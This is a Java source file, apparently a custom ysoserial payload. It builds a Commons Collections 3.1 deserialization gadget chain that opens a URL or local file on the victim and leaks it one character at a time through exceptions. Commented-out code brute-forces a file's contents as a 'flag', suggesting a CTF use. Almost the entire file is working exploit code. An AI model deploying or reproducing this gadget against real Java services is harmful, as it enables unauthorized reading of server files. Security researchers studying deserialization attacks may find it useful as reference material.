package ysoserial.payloads;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import javax.management.BadAttributeValueExpException;

import clojure.lang.Obj;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER, Authors.JASINNER})
public class CommonsCollectionsURL extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        final String[] execArgs = command.split("\\|", 3);
        String target = execArgs[0];
        Integer index = Integer.parseInt(execArgs[1]);
        Integer c = Integer.parseInt(execArgs[2]);
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{new ConstantTransformer(1)});
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(new URL(target)),
//                new ConstantTransformer(new URL("http://127.0.0.1:7777/a.txt")),
            new InvokerTransformer("openConnection", null, null),
            new InvokerTransformer("getInputStream", null, null),
            //先用for循环读取到index-1位字符
            new ClosureTransformer(new ForClosure(index, new TransformerClosure(new InvokerTransformer("read", null, null)))),
            //读取第index位字符
            new InvokerTransformer("read", null, null),//
            //EqualPredicate判断//正确进入NOPClosure，execute do nothing//失败进入ExceptionClosure，直接抛出错误
            new ClosureTransformer(
                new IfClosure(
                    new EqualPredicate(c),
                    NOPClosure.getInstance(),
                    ExceptionClosure.getInstance()
                )
            )
        };
//        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

//        return lazyMap;
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return val;
    }

    public static void main(final String[] args) throws Exception {
//        new CommonsCollectionsURL().getObject("")
//        PayloadRunner.run(CommonsCollectionsURL.class, args);

        PayloadRunner.run(CommonsCollectionsURL.class, new String[]{"file:///d:/a.txt|0|102"});
//        String flag = "";
//        for (int i = 0; i < 5; i++) {
//            for (int j = 31; j < 128; j++) {
//                try {
////                    exp(i, j);
//                    PayloadRunner.run(CommonsCollectionsURL.class, new String[]{"file:///d:/a.txt|"+String.valueOf(i)+"|"+String.valueOf(j)});
//                } catch (Exception e) {
//                    System.out.println("not this");
//                    continue;
//                }
//                flag += Character.toString(Character.toChars(j)[0]);
//                System.out.println("flag: " + flag);
//                break;
//            }
//        }

//        int count = 123;
////        Runnable runnable = new Runnable() {
////            @Override
////            public void run() {
////                System.out.println(count);
////            }
////        };
//        Runnable runnable=()-> System.out.println(count);
//        runnable.run();

    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
